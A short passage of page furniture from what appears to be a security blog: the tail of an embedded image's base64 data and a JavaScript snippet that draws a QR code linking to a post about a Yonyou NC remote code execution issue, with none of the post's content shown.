+Q+oW3iiOzxDItOFr2L+H/lTIIf3kva7zr/qsg/QHlA4Epr/ZM+Eeovp3cVcP2XfXD/b5+w3Z3dqL9GMgTvsK//Q5IU9PPwdE7/uPvme58vV85+UZwzxkb1ijPtEecrHrcO53DMSiG197A6eBwHlqwOUpgaf/fb1r4FPTsfvNq8O8H3xyPSIk13v0/I6rW9/RPGQfmLHn5eLY7zQQTTe+5gZ+eSBO9+r4kKdGH4TDGvWJEN+z/XY5dUgPe4rmO++6eUgfCOoT9Yldl4uQPsD9fz7zeLOvX35D/H6ctqgudl3eUf8OIU9TrysOyVkL4RDsulyE2adevSvkHSF1EOz5zmH2VW/jtw2kb3rz/3YDp4E4qY5X7WGeevdD8vbd5Xd6r4P06/6R95oxN67heS9IHoLW9v7yjjDXWQ9n/TQQzTe+5gaOgUCmBc/xq8eE9NHvUwPRIWhe1Cfv2POQPvD5v0LXA8nJO/benUPq1Xf16vo6mhd7HrIPcP+U9Xizr+MNebNz/d8e538AAAD//3SNK0AAAAAGSURBVAMAQnjIm7lj1boAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-ContactsFuzzySearchServlet-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 